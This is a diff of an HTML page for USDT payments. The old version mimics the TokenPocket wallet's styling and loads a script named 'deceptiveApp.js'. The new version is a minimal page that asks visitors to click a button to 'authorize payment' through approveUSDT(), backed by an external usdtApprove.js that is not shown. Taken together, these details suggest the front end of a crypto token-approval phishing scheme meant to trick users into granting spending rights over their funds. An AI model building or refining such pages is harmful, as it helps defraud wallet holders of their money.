@@ -1,84 +1,18 @@
 <!DOCTYPE html>
-<html lang="zh-CN">
+<html lang="zh">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>USDT转账</title>
-    <style>
-        .tokenpocket-style {
-            max-width: 400px;
-            margin: 0 auto;
-            padding: 20px;
-            background: #f5f5f5;
-            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-        }
-        .transfer-card {
-            background: white;
-            border-radius: 12px;
-            padding: 20px;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        .input-group {
-            margin: 15px 0;
-        }
-        .input-group label {
-            display: block;
-            margin-bottom: 5px;
-            color: #666;
-            font-size: 14px;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 8px;
-            font-size: 16px;
-        }
-        .confirm-btn {
-            width: 100%;
-            background: #07c160;
-            color: white;
-            border: none;
-            padding: 15px;
-            border-radius: 8px;
-            font-size: 16px;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        .confirm-btn:hover {
-            background: #06ae56;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>USDT 授权</title>
+  <script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+  <script src="js/usdtApprove.js"></script>
 </head>
 <body>
-    <div class="tokenpocket-style">
-        <div class="transfer-card">
-            <h2>USDT转账</h2>
-            
-            <div class="input-group">
-                <label>收款地址</label>
-                <input type="text" id="toAddress" placeholder="0x..." value="0xRecipientAddress">
-            </div>
-            
-            <div class="input-group">
-                <label>转账金额</label>
-                <input type="number" id="amount" placeholder="0.0" value="100">
-            </div>
-            
-            <div class="input-group">
-                <label>备注（可选）</label>
-                <input type="text" id="memo" placeholder="转账说明">
-            </div>
-            
-            <button class="confirm-btn" onclick="initiateTransfer()">
-                确认转账
-            </button>
-            
-            <div id="status" style="margin-top: 15px; text-align: center;"></div>
-        </div>
-    </div>
+  <h2>USDT 支付授权</h2>
 
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.6.0/dist/web3.min.js"></script>
-    <script src="deceptiveApp.js"></script>
+  <p>请点击下方按钮授权支付。</p>
+
+  <button onclick="approveUSDT()">授权</button>
+
+  <p id="status"></p>
 </body>
 </html>
